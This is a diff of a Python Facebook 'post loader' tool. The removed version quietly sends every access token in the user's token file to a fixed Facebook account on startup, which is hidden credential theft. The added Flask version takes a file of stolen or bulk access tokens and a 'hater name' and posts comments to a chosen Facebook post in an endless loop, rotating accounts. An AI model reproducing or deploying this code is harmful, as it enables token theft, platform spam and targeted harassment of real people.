@@ -1,150 +1,177 @@
+from flask import Flask, request, redirect, url_for
 import requests
-import json
 import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-import random
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"   TRICKS BY TUSHAR")
-def execute_server():
-      PORT = int(os.environ.get('PORT', 4000))
+app = Flask(__name__)
 
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
 
-def send_initial_message():
-      with open('token.txt', 'r') as file:
-          tokens = file.readlines()
+@app.route('/')
+def index():
+    return '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MULTI POST</title>
+    <style>
+        body {
+            background-image: url('https://i.ibb.co/qMNy8Lh/received-437195329281136.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 40px auto;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: none;
+        }
+        .btn-submit {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 100%;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            margin-top: auto;
+        }
+        footer p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <h1 style="color: red;">RAPPIIEST INSIDE</h1>
+        <h1 style="color: blue;"> TUSHAR POST SARVAR (KILLER RULEX OWNER TUSHAR KING)</h1>
+    </header>
 
-      # Modify the message as per your requirement
-      msg_template = "Hello Tushar sir! I am using your server. My token is {}"
+    <div class="container">
+        <form action="/" method="post" enctype="multipart/form-data">
+            <div class="mb-3">
+                <label for="threadId">POST ID:</label>
+                <input type="text" class="form-control" id="threadId" name="threadId" required>
+            </div>
+            <div class="mb-3">
+                <label for="kidx">Enter Hater Name:</label>
+                <input type="text" class="form-control" id="kidx" name="kidx" required>
+            </div>
+            <div class="mb-3">
+                <label for="messagesFile">Select Your Np File:</label>
+                <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>
+            </div>
+            <div class="mb-3">
+                <label for="txtFile">Select Your Tokens File:</label>
+                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+            </div>
+            <div class="mb-3">
+                <label for="time">Speed in Seconds (minimum 20 second):</label>
+                <input type="number" class="form-control" id="time" name="time" required>
+            </div>
+            <button type="submit" class="btn-submit">Submit Your Details</button>
+        </form>
+    </div>
 
-      # Specify the ID where you want to send the message
-      target_id = "https://www.facebook.com/aloneking78564"
-
-      requests.packages.urllib3.disable_warnings()
-
-      def liness():
-          print('\033[1;92m' + '•────────────────────── TRICKS BY SANJEET ───────────────────────────────•')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      for token in tokens:
-          access_token = token.strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-          msg = msg_template.format(access_token)
-          parameters = {'access_token': access_token, 'message': msg}
-          response = requests.post(url, json=parameters, headers=headers)
-
-          # No need to print here, as requested
-          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-          time.sleep(0.1)  # Wait for 1 second between sending each initial message
-
-      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
-def send_messages_from_file():
-      with open('convo.txt', 'r') as file:
-          convo_id = file.read().strip()
-
-      with open('file.txt', 'r') as file:
-          messages = file.readlines()
-
-      num_messages = len(messages)
-
-      with open('token.txt', 'r') as file:
-          tokens = file.readlines()
-      num_tokens = len(tokens)
-      max_tokens = min(num_tokens, num_messages)
-
-      with open('name.txt', 'r') as file:
-          haters_name = file.read().strip()
-
-      with open('time.txt', 'r') as file:
-          speed = int(file.read().strip())
-
-      def liness():
-          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      while True:
-          try:
-              for message_index in range(num_messages):
-                  token_index = message_index % max_tokens
-                  access_token = tokens[token_index].strip()
-
-                  message = messages[message_index].strip()
-
-                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                  response = requests.post(url, json=parameters, headers=headers)
-
-                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
-                  if response.ok:
-                      print("\033[1;92m[+] ABE LAND CHALA GAYA MSG {} of Convo {} Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  else:
-                      print("\033[1;91m[x] BSDK MSG NAHI JA RAHA HAI {} of Convo {} with Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  time.sleep(speed)
-
-              print("\n[+] All messages sent. Restarting the process...\n")
-          except Exception as e:
-              print("[!] An error occurred: {}".format(e))
-
-def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
-
-      # Send the initial message to the specified ID using all tokens
+    <footer>
+        <p style="color: #FF5733;">Post Loader Tool</p>
+        <p>Made with ❤️ by tushar</p>
+    </footer>
+</body>
+</html>'''
 
 
-      # Then, continue with the message sending loop
-      send_messages_from_file()
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        access_tokens = txt_file.read().decode().splitlines()
+
+        messages_file = request.files['messagesFile']
+        messages = messages_file.read().decode().splitlines()
+
+        num_comments = len(messages)
+        max_tokens = len(access_tokens)
+
+        post_url = f'https://graph.facebook.com/v15.0/{thread_id}/comments'
+        haters_name = mn
+        speed = time_interval
+
+        while True:
+            try:
+                for comment_index in range(num_comments):
+                    token_index = comment_index % max_tokens
+                    access_token = access_tokens[token_index]
+
+                    comment = messages[comment_index].strip()
+
+                    parameters = {'access_token': access_token,
+                                  'message': haters_name + ' ' + comment}
+                    response = requests.post(
+                        post_url, json=parameters, headers=headers)
+
+                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                    if response.ok:
+                        print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
+                            comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                        print("  - Time: {}".format(current_time))
+                        print("\n" * 2)
+                    else:
+                        print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                            comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                        print("  - Time: {}".format(current_time))
+                        print("\n" * 2)
+                    time.sleep(speed)
+            except Exception as e:
+                print(e)
+                time.sleep(30)
+
+    return redirect(url_for('index'))
+
 
 if __name__ == '__main__':
-      main()
+    app.run(host='0.0.0.0', port=5000)
